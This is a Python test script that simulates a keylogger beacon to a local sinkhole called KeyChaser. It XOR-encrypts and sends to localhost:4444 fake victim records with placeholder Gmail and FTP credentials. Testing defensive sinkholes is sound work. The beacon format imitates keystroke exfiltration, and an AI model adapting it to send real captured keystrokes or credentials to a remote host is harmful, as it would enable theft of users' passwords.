"""
Test script to simulate malware beacon to KeyChaser.

This script simulates a simple keylogger connecting to the sinkhole
and sending encrypted keystroke data.
"""

import socket
import time


def xor_encrypt(data: bytes, key: bytes) -> bytes:
    """XOR encryption (symmetric)."""
    return bytes(data[i] ^ key[i % len(key)] for i in range(len(data)))


def send_beacon():
    """Send a test beacon to the KeyChaser sinkhole."""
    # KeyChaser connection details
    HOST = "localhost"
    PORT = 4444  # ExampleLogger port
    
    # XOR key (must match the handler)
    XOR_KEY = b"SecretKey123"
    
    # Simulated keylogger payload
    # Format: BOT_ID|HOSTNAME|USERNAME|OS|WINDOW|KEYSTROKES
    payload = (
        "TEST-BOT-001|"
        "VICTIM-PC|"
        "john.doe|"
        "Windows 10 Pro|"
        "Chrome - Gmail - Login|"
        "username: john.doe@example.com[TAB]password: MyS3cr3tP@ss![ENTER]"
    )
    
    print("[*] KeyChaser Test Client")
    print(f"[*] Connecting to {HOST}:{PORT}...")
    
    try:
        # Connect to sinkhole
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)
        sock.connect((HOST, PORT))
        print(f"[+] Connected to sinkhole!")
        
        # Encrypt payload with XOR
        encrypted = xor_encrypt(payload.encode(), XOR_KEY)
        print(f"[*] Sending {len(encrypted)} bytes of encrypted data...")
        print(f"[*] Payload preview: {payload[:80]}...")
        
        # Send encrypted data
        sock.send(encrypted)
        print("[+] Data sent!")
        
        # Wait for response
        print("[*] Waiting for response...")
        response = sock.recv(1024)
        
        if response:
            decrypted_response = xor_encrypt(response, XOR_KEY)
            print(f"[+] Received response: {decrypted_response.decode('utf-8', errors='ignore')}")
        else:
            print("[-] No response received")
        
        sock.close()
        print("[+] Connection closed")
        print("\n[*] Test complete! Check the KeyChaser dashboard at http://localhost:8000")
        
    except ConnectionRefusedError:
        print("[-] ERROR: Connection refused. Is KeyChaser running?")
    except Exception as e:
        print(f"[-] ERROR: {e}")


if __name__ == "__main__":
    print("=" * 60)
    send_beacon()
    print("=" * 60)
    
    print("\n[*] Sending a second beacon to simulate persistent infection...")
    time.sleep(2)
    
    # Send another beacon with different data
    HOST = "localhost"
    PORT = 4444
    XOR_KEY = b"SecretKey123"
    
    payload2 = (
        "TEST-BOT-001|"
        "VICTIM-PC|"
        "john.doe|"
        "Windows 10 Pro|"
        "Notepad - passwords.txt|"
        "FTP Server: ftp.example.com[ENTER]Username: admin[ENTER]Password: SuperSecret123"
    )
    
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)
        sock.connect((HOST, PORT))
        encrypted = xor_encrypt(payload2.encode(), XOR_KEY)
        sock.send(encrypted)
        response = sock.recv(1024)
        sock.close()
        print("[+] Second beacon sent successfully!")
    except Exception as e:
        print(f"[-] Second beacon failed: {e}")
    
    print("\n[✓] All tests complete!")
    print("[→] Visit http://localhost:8000 to see captured data in the dashboard")
